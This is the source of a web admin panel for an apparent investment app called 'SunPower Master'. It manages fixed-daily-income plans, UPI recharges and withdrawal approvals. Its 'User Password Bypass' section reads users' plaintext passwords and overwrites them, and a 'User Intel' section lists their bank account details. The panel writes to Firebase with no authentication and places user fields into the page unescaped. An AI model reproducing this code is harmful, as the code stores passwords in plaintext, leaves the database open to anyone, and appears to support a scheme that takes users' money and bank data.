<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Core System | SunPower Master</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background-color: #050507; color: #e2e8f0; font-family: 'Courier New', monospace; }
        .cyber-card { background: #0d0d12; border: 1px solid #1f1f27; box-shadow: 0 0 20px rgba(0,0,0,0.8); }
        .user-box { border-left: 3px solid #ef4444; background: #12121a; }
        .neon-green { color: #22c55e; text-shadow: 0 0 10px rgba(34, 197, 94, 0.5); }
        .neon-red { color: #ef4444; text-shadow: 0 0 10px rgba(239, 68, 68, 0.5); }
        .neon-blue { color: #3b82f6; text-shadow: 0 0 10px rgba(59, 130, 246, 0.5); }
        input, textarea { background: #16161d !important; color: #22c55e !important; border: 1px solid #2d2d39 !important; outline: none; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #1f1f27; }
    </style>
</head>
<body class="pb-24">

    <div class="bg-black border-b border-red-900/50 p-8">
        <h1 class="text-2xl font-black neon-red uppercase italic tracking-tighter">
            <i class="fas fa-skull-crossbones mr-2"></i> System Mainframe
        </h1>
        <div class="flex gap-4 mt-4 text-[10px] font-black uppercase tracking-widest">
            <div class="bg-blue-900/20 border border-blue-500/30 px-3 py-1 rounded">Nodes: <span id="statPlans">0</span></div>
            <div class="bg-green-900/20 border border-green-500/30 px-3 py-1 rounded">Users: <span id="statUsers">0</span></div>
        </div>
    </div>

    <div class="p-4 space-y-8">

        <div class="cyber-card p-6 rounded-[30px] border-t-2 border-pink-600">
            <h3 class="text-xs font-black uppercase text-pink-500 mb-4 italic"><i class="fas fa-images mr-2"></i> Banner Photo Slider Control</h3>
            <p class="text-[9px] text-gray-500 mb-2 uppercase">* एकापेक्षा जास्त फोटोसाठी मध्ये स्वल्पविराम (,) द्या.</p>
            <textarea id="bannerUrlInput" placeholder="IMAGE_URL_1, IMAGE_URL_2, IMAGE_URL_3" class="w-full p-4 rounded-2xl text-[10px] font-bold mb-3 h-20"></textarea>
            <div class="flex gap-2">
                <button onclick="updateBanner()" class="flex-1 bg-pink-700 text-white py-4 rounded-2xl font-black uppercase text-[10px]">Update Slider</button>
                <button onclick="deleteBanner()" class="bg-red-900/40 text-red-500 border border-red-500/30 px-6 rounded-2xl"><i class="fas fa-trash"></i></button>
            </div>
        </div>

        <div class="cyber-card p-6 rounded-[30px] border-t-2 border-green-500">
            <h3 class="text-xs font-black uppercase neon-green mb-4 italic"><i class="fas fa-user-shield mr-2"></i> User Password Bypass</h3>
            <div class="flex gap-2 mb-4">
                <input type="number" id="searchTargetMob" placeholder="TARGET_MOBILE" class="flex-1 p-4 rounded-2xl text-[10px] font-bold">
                <button onclick="searchUserForPwd()" class="bg-green-700 text-white px-6 rounded-2xl text-[10px] font-black uppercase">Search</button>
            </div>
            
            <div id="pwdUpdateBox" class="hidden space-y-3 bg-black/40 p-4 rounded-2xl border border-green-900/30">
                <div class="flex justify-between text-[10px] font-black uppercase mb-2">
                    <span class="text-gray-500">Target: <span id="pwdDisplayMob" class="text-white"></span></span>
                    <span class="neon-green">STATUS: FOUND</span>
                </div>
                <input type="text" id="newTargetPwd" placeholder="ENTER NEW PASSWORD" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                <button onclick="updateUserPassword()" class="w-full bg-green-600 text-white py-4 rounded-2xl font-black uppercase text-[10px]">Overdrive (Update Password)</button>
            </div>
            <p id="pwdError" class="hidden text-[10px] text-red-500 font-bold mt-2 italic text-center">Protocol Error: User not found in database.</p>
        </div>

        <div class="cyber-card p-6 rounded-[30px] border-t-2 border-blue-600">
            <h3 class="text-xs font-black uppercase text-blue-500 mb-4 italic"><i class="fas fa-project-diagram mr-2"></i> Manage Investment Plans</h3>
            <div class="space-y-3 mb-6">
                <input type="text" id="pName" placeholder="Plan Name (e.g. SOLAR V1)" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                <div class="grid grid-cols-2 gap-2">
                    <input type="number" id="pPrice" placeholder="Price (₹)" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                    <input type="number" id="pDaily" placeholder="Daily Income (₹)" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                </div>
                <div class="grid grid-cols-2 gap-2">
                    <input type="number" id="pTotal" placeholder="Total Income (₹)" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                    <input type="number" id="pDays" placeholder="Validity (Days)" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                </div>
                <input type="text" id="pImage" placeholder="Image URL" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                <button onclick="addPlan()" class="w-full bg-blue-700 text-white py-4 rounded-2xl font-black uppercase text-[10px]">Deploy New Node (Plan)</button>
            </div>
            <div id="plansList" class="space-y-3 border-t border-white/5 pt-4"></div>
        </div>

        <div class="cyber-card p-6 rounded-[30px] border-t-2 border-yellow-500">
            <h3 class="text-xs font-black uppercase text-yellow-500 mb-4 italic"><i class="fas fa-bullhorn mr-2"></i> Broadcast Management</h3>
            <textarea id="notifMsg" placeholder="नवीन Alert मेसेज टाइप करा..." class="w-full p-4 rounded-2xl text-[10px] font-bold mb-3 h-20"></textarea>
            <button onclick="updateNotice()" class="w-full bg-yellow-600 text-white py-4 rounded-2xl font-black uppercase text-[10px] mb-4">Push New Alert</button>
            
            <div class="mt-4 border-t border-white/10 pt-4">
                <p class="text-[10px] font-black text-gray-500 uppercase mb-3">Live Notification:</p>
                <div id="activeNotifBox" class="bg-black/40 p-4 rounded-2xl border border-yellow-900/30 flex justify-between items-center">
                    <p id="currentNoticeText" class="text-[10px] font-bold text-yellow-200 italic">No Active Notice</p>
                    <button onclick="deleteGlobalNotice()" class="text-red-500 p-2"><i class="fas fa-trash-alt"></i></button>
                </div>
            </div>
        </div>

        <div class="cyber-card p-6 rounded-[30px] border-t-2 border-indigo-500">
            <h3 class="text-xs font-black uppercase text-indigo-500 mb-4 italic"><i class="fas fa-envelope mr-2"></i> Private Alert (Target User)</h3>
            <input type="text" id="targetMob" placeholder="TARGET_MOBILE_NUMBER" class="w-full p-4 rounded-2xl text-[10px] font-bold mb-2">
            <textarea id="privateMsg" placeholder="फक्त एका युजरला Alert म्हणून दिसेल..." class="w-full p-4 rounded-2xl text-[10px] font-bold mb-3 h-20"></textarea>
            <button onclick="sendPrivateMsg()" class="w-full bg-indigo-700 text-white py-4 rounded-2xl font-black uppercase text-[10px]">Send Private Alert</button>
        </div>

        <div class="cyber-card p-6 rounded-[30px]">
            <h3 class="text-xs font-black uppercase text-red-500 mb-4 italic">User Intel [Bank Details & PWD]</h3>
            <div id="usersList" class="space-y-4 max-h-[400px] overflow-y-auto pr-2"></div>
        </div>

        <div class="cyber-card p-6 rounded-[30px] border-t-2 border-orange-600">
            <h3 class="text-xs font-black uppercase text-orange-500 mb-4 italic">Incoming Credits (Recharge)</h3>
            <div id="rechargeList" class="space-y-4"></div>
        </div>

        <div class="cyber-card p-6 rounded-[30px] border-t-2 border-red-600">
            <h3 class="text-xs font-black uppercase text-red-500 mb-4 italic">Outgoing Data (Withdrawal Requests)</h3>
            <div id="withdrawList" class="space-y-4"></div>
        </div>

        <div class="cyber-card p-6 rounded-[30px] border-t-2 border-green-600">
            <h3 class="text-xs font-black uppercase text-green-500 mb-4 italic">Core Protocol Setup</h3>
            <div class="space-y-3">
                <input type="text" id="qrLink" placeholder="QR_IMG_URL" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                <input type="text" id="upiId" placeholder="GATEWAY_UPI_ID" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                <input type="text" id="supportUrl" placeholder="SUPPORT_URL" class="w-full p-4 rounded-2xl text-[10px] font-bold">
                <button onclick="updateSettings()" class="w-full bg-green-700 text-white py-4 rounded-2xl font-black uppercase text-[10px]">Update Protocol</button>
            </div>
        </div>

    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, getDoc, setDoc, collection, getDocs, deleteDoc, updateDoc, query, where, orderBy, increment, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA3k5ByUuJ-1jtVovgZMxsw1LBaBkn_nDo",
            authDomain: "new-investment-web.firebaseapp.com",
            projectId: "new-investment-web",
            storageBucket: "new-investment-web.firebasestorage.app",
            messagingSenderId: "1078188475858",
            appId: "1:1078188475858:web:b3777ea127aae8083740b"
        };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // --- BANNER SLIDER ---
        window.updateBanner = async () => {
            const urls = document.getElementById('bannerUrlInput').value;
            if(!urls) return alert("Please enter image URL(s)!");
            await updateDoc(doc(db, "settings", "global"), { bannerUrl: urls });
            alert("Slider System Updated!");
            location.reload();
        };

        window.deleteBanner = async () => {
            if(confirm("Wipe all banner images?")) {
                await updateDoc(doc(db, "settings", "global"), { bannerUrl: "" });
                alert("Slider Wiped!");
                location.reload();
            }
        };

        // --- PASSWORD BYPASS ---
        window.searchUserForPwd = async () => {
            const mob = document.getElementById('searchTargetMob').value;
            if(!mob) return alert("Enter Mobile!");
            const userSnap = await getDoc(doc(db, "users", mob));
            if(userSnap.exists()){
                document.getElementById('pwdUpdateBox').classList.remove('hidden');
                document.getElementById('pwdError').classList.add('hidden');
                document.getElementById('pwdDisplayMob').innerText = mob;
                document.getElementById('newTargetPwd').value = userSnap.data().password;
            } else {
                document.getElementById('pwdUpdateBox').classList.add('hidden');
                document.getElementById('pwdError').classList.remove('hidden');
            }
        };

        window.updateUserPassword = async () => {
            const mob = document.getElementById('pwdDisplayMob').innerText;
            const newPwd = document.getElementById('newTargetPwd').value;
            if(!newPwd) return alert("Enter New Password!");
            await updateDoc(doc(db, "users", mob), { password: newPwd });
            alert("Password Updated!");
            location.reload();
        };

        // --- PLANS ---
        window.addPlan = async () => {
            const name = document.getElementById('pName').value;
            const price = Number(document.getElementById('pPrice').value);
            const daily = Number(document.getElementById('pDaily').value);
            const total = Number(document.getElementById('pTotal').value);
            const days = Number(document.getElementById('pDays').value);
            const img = document.getElementById('pImage').value;
            if(!name || !price) return alert("Missing Data!");
            await addDoc(collection(db, "plans"), { name, price, daily, totalIncome: total, days, image: img });
            alert("Plan Deployed!");
            location.reload();
        };

        async function fetchPlans() {
            const snap = await getDocs(collection(db, "plans"));
            const list = document.getElementById('plansList');
            document.getElementById('statPlans').innerText = snap.size;
            list.innerHTML = "";
            snap.forEach(d => {
                const p = d.data();
                list.innerHTML += `<div class="bg-white/5 p-4 rounded-2xl flex justify-between items-center border border-white/5">
                    <div><p class="text-[10px] font-black uppercase">${p.name}</p>
                    <p class="text-[8px] text-blue-400">P: ₹${p.price} | D: ₹${p.daily}</p></div>
                    <button onclick="deletePlan('${d.id}')" class="text-red-500 p-2"><i class="fas fa-trash"></i></button>
                </div>`;
            });
        }
        window.deletePlan = async (id) => { if(confirm("Delete?")) { await deleteDoc(doc(db, "plans", id)); location.reload(); } };

        // --- BROADCAST ---
        window.updateNotice = async () => {
            const msg = document.getElementById('notifMsg').value;
            if(!msg) return alert("Please type a message!");
            await updateDoc(doc(db, "settings", "global"), { notice: msg, noticeId: Date.now().toString() });
            alert("Broadcast Pushed!");
            location.reload();
        };

        window.deleteGlobalNotice = async () => {
            if(confirm("Delete this notification?")) {
                await updateDoc(doc(db, "settings", "global"), { notice: "", noticeId: "" });
                alert("Deleted!");
                location.reload();
            }
        };

        async function loadNotice() {
            const snap = await getDoc(doc(db, "settings", "global"));
            if(snap.exists() && snap.data().notice) {
                document.getElementById('currentNoticeText').innerText = snap.data().notice;
            }
        }

        // --- PRIVATE ALERT ---
        window.sendPrivateMsg = async () => {
            const mob = document.getElementById('targetMob').value;
            const msg = document.getElementById('privateMsg').value;
            await updateDoc(doc(db, "users", mob), { personalMsg: msg, msgSeen: false });
            alert("Sent to " + mob);
        };

        // --- USER INTEL ---
        async function fetchUsers() {
            const snap = await getDocs(collection(db, "users"));
            const list = document.getElementById('usersList');
            document.getElementById('statUsers').innerText = snap.size;
            list.innerHTML = "";
            snap.forEach(d => {
                const u = d.data();
                list.innerHTML += `<div class="user-box p-4 rounded-xl mb-2">
                    <p class="text-[10px] font-black uppercase neon-green">NAME: ${u.nickname || "Not Set"}</p>
                    <p class="text-[10px] font-black">MOB: ${d.id} | BAL: ₹${(u.balance || 0).toFixed(2)}</p>
                    <p class="text-[8px] text-gray-500 italic">BANK: ${u.bankName || 'N/A'} | ACC: ${u.bankAcc || 'N/A'}</p>
                </div>`;
            });
        }

        // --- TRANSACTIONS (RECHARGE & WITHDRAWAL) ---
        async function loadTransactions() {
            const rSnap = await getDocs(query(collection(db, "recharges"), where("status", "==", "Pending")));
            const rList = document.getElementById('rechargeList');
            rList.innerHTML = "";
            rSnap.forEach(d => {
                const r = d.data();
                rList.innerHTML += `<div class="bg-black/50 p-4 border border-orange-900/20 rounded-xl">
                    <p class="text-[9px] uppercase font-black">USR: ${r.userMobile} | ₹${r.amount}</p>
                    <div class="flex gap-2 mt-2">
                        <button onclick="manageRec('${d.id}','${r.userMobile}',${r.amount},'Approved')" class="flex-1 bg-green-900/20 text-green-500 text-[8px] py-2 rounded font-black">APPROVE</button>
                        <button onclick="manageRec('${d.id}','${r.userMobile}',${r.amount},'Rejected')" class="flex-1 bg-red-900/20 text-red-500 text-[8px] py-2 rounded font-black">REJECT</button>
                    </div>
                </div>`;
            });

            const wSnap = await getDocs(query(collection(db, "withdrawals"), where("status", "==", "Pending")));
            const wList = document.getElementById('withdrawList');
            wList.innerHTML = "";
            wSnap.forEach(d => {
                const w = d.data();
                wList.innerHTML += `<div class="bg-black/50 p-4 border border-red-900/20 rounded-xl">
                    <p class="text-[9px] uppercase font-black">USR: ${w.userMobile} | ₹${w.amount}</p>
                    <div class="flex gap-2 mt-2">
                        <button onclick="manageWit('${d.id}','Completed')" class="flex-1 bg-blue-900/20 text-blue-500 text-[8px] py-2 rounded font-black">PAID</button>
                        <button onclick="manageWit('${d.id}','Rejected')" class="flex-1 bg-red-900/20 text-red-500 text-[8px] py-2 rounded font-black">REJECT</button>
                    </div>
                </div>`;
            });
        }

        // RECHARGE REMARK LOGIC
        window.manageRec = async (id, mob, amt, status) => {
            const remark = prompt(`Enter remark for ${status}:`, status === 'Approved' ? 'Verified' : 'Invalid UTR');
            if (remark === null) return; 

            if (status === 'Approved') {
                await updateDoc(doc(db, "users", mob), { balance: increment(amt) });
            }
            await updateDoc(doc(db, "recharges", id), { status: status, remark: remark });
            alert(`Recharge ${status}!`); 
            location.reload();
        };

        // WITHDRAWAL REMARK LOGIC
        window.manageWit = async (id, status) => {
            const remark = prompt(`Enter remark for ${status}:`, status === 'Completed' ? 'Success' : 'Rejected');
            if (remark === null) return;

            await updateDoc(doc(db, "withdrawals", id), { status: status, remark: remark });
            alert(`Withdrawal ${status}!`);
            location.reload();
        };

        window.updateSettings = async () => {
            await setDoc(doc(db, "settings", "global"), {
                qr: document.getElementById('qrLink').value,
                upi: document.getElementById('upiId').value,
                support: document.getElementById('supportUrl').value
            }, { merge: true });
            alert("Protocol Updated!");
        };

        async function init() {
            const sSnap = await getDoc(doc(db, "settings", "global"));
            if(sSnap.exists()){
                const s = sSnap.data();
                document.getElementById('qrLink').value = s.qr || "";
                document.getElementById('upiId').value = s.upi || "";
                document.getElementById('supportUrl').value = s.support || "";
                document.getElementById('bannerUrlInput').value = s.bannerUrl || "";
            }
            fetchPlans(); fetchUsers(); loadTransactions(); loadNotice();
        }
        init();
    </script>
</body>
</html>
